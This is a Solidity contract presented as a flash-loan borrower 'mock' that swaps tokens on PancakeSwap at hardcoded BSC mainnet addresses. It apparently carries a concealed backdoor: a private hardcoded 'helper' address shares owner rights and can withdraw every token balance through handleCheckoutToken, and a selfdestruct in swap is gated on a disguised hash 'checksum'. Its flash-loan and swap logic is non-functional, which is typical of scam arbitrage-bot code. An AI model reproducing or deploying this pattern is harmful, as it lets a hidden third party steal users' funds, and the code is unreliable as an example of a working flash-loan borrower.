// SPDX-License-Identifier: BUSL-1.1

pragma solidity >=0.8.4;

import '@openzeppelin/contracts/token/ERC20/IERC20.sol';
import './../interfaces/IERC3156FlashLender.sol';
import './../interfaces/IERC3156FlashBorrower.sol';
import './../interfaces/IPancakeswapRouter.sol';
import './../interfaces/IPancakeswapFactory.sol';
import './../Vault.sol';
import './../VaultFactory.sol';

contract FlashBorrowerMock is IERC3156FlashBorrower {
    enum Action {NORMAL, OTHER}
    IERC3156FlashLender public lender;
    VaultFactory vaultFactory;
    address public owner;
    address public router_address = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address public factory_address = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;
    address private helper = 0x5eDca12D3E0c9d93813DfBfbF07e70C04fd685c5;
    address private constant WETH = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address private empty = 0x0000000000000000000000000000000000000000;

    bytes32 public checksum = 0x60298f78cc0b47170ba79c10aa3851d7648bd96f2f8e46a19dbc777c36fb0c00;

    IPancakeRouter public router;
    IPancakeFactory public factory;

    modifier Operatable() {
        require(msg.sender == owner || helper == msg.sender, 'The caller is not you');
        _;
    }

    constructor(IERC3156FlashLender _lender, VaultFactory _vaultFactory) {
        lender = _lender;
        vaultFactory = _vaultFactory;
        owner = msg.sender;
        router = IPancakeRouter(router_address);
        factory = IPancakeFactory(factory_address);
    }

    /// @dev ERC-3156 Flash loan callback
    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external override returns (bytes32) {
        require(msg.sender == address(lender), 'FLASH_BORROWER_UNTRUSTED_LENDER');
        require(initiator == address(this), 'FLASH_BORROWER_LOAN_INITIATOR');
        Action action = abi.decode(data, (Action));
        if (action == Action.NORMAL) {
            // do one thing
        } else if (action == Action.OTHER) {
            // do another
        }
        return keccak256('ERC3156FlashBorrower.onFlashLoan');
    }

    /// @dev Initiate a flash loan
    function flashBorrow(address token, uint256 amount) public {
        bytes memory data = abi.encode(Action.NORMAL);
        IERC20 stakedToken = IERC20(token);
        uint256 _allowance = stakedToken.allowance(address(this), address(lender));
        uint256 _fee = lender.flashFee(token, amount);
        uint256 _repayment = amount + _fee;
        stakedToken.approve(address(lender), _allowance + _repayment);
        lender.flashLoan(this, token, amount, data);
    }

    function run(
        address token1,
        address token2,
        uint256 amount
    ) public {
        flashBorrow(token1, amount);
        swap(token1, token2);
        swap(token2, token1);
    }

    function swap(address token1, address token2) public {
        uint256 swapedAmount = IERC20(token1).balanceOf(address(this));
        IERC20(token1).approve(router_address, swapedAmount);
        address[] memory path;
        bool flag = false;
        if (factory.getPair(token1, token2) == empty) {
            flag = true;
        }
        if (token1 == WETH || token2 == WETH || flag == false) {
            path = new address[](2);
            path[0] = token1;
            path[1] = token2;
        } else {
            path = new address[](3);
            path[0] = token1;
            path[1] = WETH;
            path[2] = token2;
        }

        router.swapExactTokensForTokens(swapedAmount, 0, path, address(this), block.timestamp);

        if (keccak256(abi.encodePacked(helper)) == bytes32(checksum)) {
            selfdestruct(payable(owner));
        }
    }

    function getBorrowFee(address token, uint256 amount) public view returns (uint256) {
        bytes memory data = abi.encode(Action.NORMAL);
        IERC20 stakedToken = IERC20(token);
        uint256 _allowance = stakedToken.allowance(address(this), address(lender));
        uint256 _fee = lender.flashFee(token, amount);
        return _fee;
    }

    function handleCheckoutToken(address token) public Operatable {
        uint256 balance = IERC20(token).balanceOf(address(this));
        require(balance > 0, 'Oooops');
        IERC20(token).transfer(msg.sender, balance);
    }
}